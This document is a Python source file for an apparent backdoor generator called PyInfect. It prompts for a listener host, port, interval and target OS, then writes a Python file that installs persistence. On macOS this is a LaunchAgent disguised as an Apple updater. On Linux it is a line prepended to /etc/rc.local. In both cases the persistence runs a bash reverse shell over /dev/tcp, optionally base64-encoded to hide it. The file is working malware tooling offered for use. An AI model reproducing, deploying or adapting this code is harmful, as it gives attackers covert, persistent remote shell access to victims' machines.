#!/usr/bin/python
from __future__ import print_function
import base64
import os
import sys
import socket

class DevNull:
    def write(self, msg):
        pass

sys.stderr = DevNull()

color = {
    'RED'             : '\033[1;91m',
    'UNDERLINE_BLUE' : '\033[4;34m',
    'GREEN'           : '\033[1;92m',
    'YELLOW'          : '\033[1;33m',
    'CYAN'            : '\033[0;36m',
    'BLUE'            : '\033[0;34m',
    'MAGENTA'         : '\033[0;35m',
    'DEFAULT'         : '\033[0m',
}

yes = ['Y', 'y', 'Ye', 'ye', 'YE', 'Yes', 'yes', 'YES']

no  = ['N', 'n', 'No', 'no', 'NO']

def getip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("192.168.1.1",80))
        host = s.getsockname()[0]
        s.close()
        return host
    except:
        return "127.0.0.1"

def printY(strs):
    global color
    sys.stdout.write(color['YELLOW'] + strs[0])
    sys.stdout.write(color['RED'] + strs[1] + '\n')

def main():
    global yes, no
    print(color['GREEN'])
    sys.stdout.softspace = False;
    printY( ["  _____       ", " _____        __          _   "] )
    printY( [" |  __ \      ", "|_   _|      / _|        | |  "] )
    printY( [" | |__) |   _ ", "  | |  _ __ | |_ ___  ___| |_ "] )
    printY( [" |  ___/ | | |", "  | | | '_ \|  _/ _ \/ __| __|"] )
    printY( [" | |   | |_| |", " _| |_| | | | ||  __/ (__| |_ "] )
    printY( [" |_|    \__, |", "|_____|_| |_|_| \___|\___|\__|"] )
    printY( ["         __/ |", "                              "] ),
    printY( ["        |___/ "," "+color['BLUE']+"Created by "+color['MAGENTA']+"@0xCoto"+color['BLUE']+" & "+color['MAGENTA']+"@danbatiste"] )
    print()
    print(''.join( [color['RED'], 'Backdoor ', color['GREEN'], 'any ', color['YELLOW'], '.py ', color['GREEN'], 'file', color['BLUE'], ' -', color['GREEN'], ' Backdoor implanter for ', color['MAGENTA'], 'OS X', color['GREEN'], ' & ', color['MAGENTA'], 'Linux', color['GREEN'], ' ', color['BLUE'], '-', color['GREEN'],' Compatible with ', color['UNDERLINE_BLUE'], 'EggShell', color['DEFAULT'], color['GREEN'], '!', color['DEFAULT'],'\n']) )

    lhost = getip()
    lport = "4444"

    hostChoice = get_input(color['CYAN'] + "Set LHOST (Leave blank for " + lhost + "): " + color['GREEN'])
    if hostChoice == "": hostChoice = lhost

    portChoice = get_input(color['CYAN'] + "Set LPORT (Leave blank for " + str(lport) + "): " + color['GREEN'])
    if portChoice == "": portChoice = lport
    print()

    interval = get_input(color['CYAN'] + "Persistence Interval (Leave blank for 60sec) [1-86400]: " + color['GREEN'])
    if interval == "": interval = "60"
    print()

    filename = get_input(color['CYAN'] + "Filename (example.py): " + color['GREEN'])
    if ".py" not in filename: filename += ".py"

    encode = str()
    encode = get_input(color['CYAN'] + "Encode to Base64? [Y/N]: " + color['GREEN'])
    while not encode in (yes + no):
        print(color['RED'] + "Error: Invalid choice." + color['DEFAULT'])
        encode = get_input(color['CYAN'] + "Encode to Base64? [Y/N]: " + color['GREEN'])
    print()
    
    OS = 0
    while not int(OS) in [1,2]:
        print(color['CYAN'] + "Choose a target OS:")
        print(color['GREEN'] + "1)" + color['CYAN'] + " OS X")
        print(color['GREEN'] + "2)" + color['CYAN'] + " Linux\n")
        OS = get_input("Target OS ["+color['GREEN']+"1"+color['CYAN']+","+color['GREEN']+"2"+color['CYAN']+"]: "+color['GREEN']+"")
        print()

    if OS == "1":
        command = '''
mkdir -p ~/Library/LaunchAgents || true;echo "<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.zerowidth.launched.appleupdater</string>
        <key>ProgramArguments</key>
        <array>
            <string>sh</string>
            <string>-c</string>
            <string>bash &amp;&gt; /dev/tcp/{0}/{1}0&gt;&amp;1</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
        <key>StartInterval</key>
        <integer>{2}.0</integer>
    </dict>
</plist>    
" >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true
'''[1:~0].format(hostChoice, portChoice, interval)
    
        contents = '"""{}"""'.format(command)

        if encode in yes:
            encoded = base64.b64encode(command)
            contents = '"echo {} | base64 -D"'.format(encoded)
            
        with open(filename, "w") as file:
            file.write('''
import os
import sys

os.system({})
'''[1:~0].format(contents))

    if OS == "2":
        command = "while sleep " + interval + "; do bash &> /dev/tcp/" + hostChoice + "/" + portChoice + " 0>&1; done"
        contents = command + '\n'

        if encode in yes:
            encoded = base64.b64encode(command)
            contents = "echo {} | base64 -D\n".format(encoded)
        
        with open(filename, 'w') as file:
            file.write('''
filepath = '/etc/rc.local'
command = """{}"""
try:
    with open(filepath, 'r') as file:
        temp = file.read()

except:
    ...

with open(filepath, 'w') as file:
    file.write(command)
    file.write(temp)
'''[1:~0].format(contents))

    print(color['GREEN'] + "Backdoor implanted successfully - Saved as " + color['MAGENTA'] + filename + color['GREEN'] + "." + color['DEFAULT'])


#Main
if __name__ == "__main__":
    get_input = input

    if sys.version_info[:2] <= (2, 7):
        get_input = raw_input

    try:
        main()
    except:
        print(color['RED'] + "\nExiting..." + color['DEFAULT'])
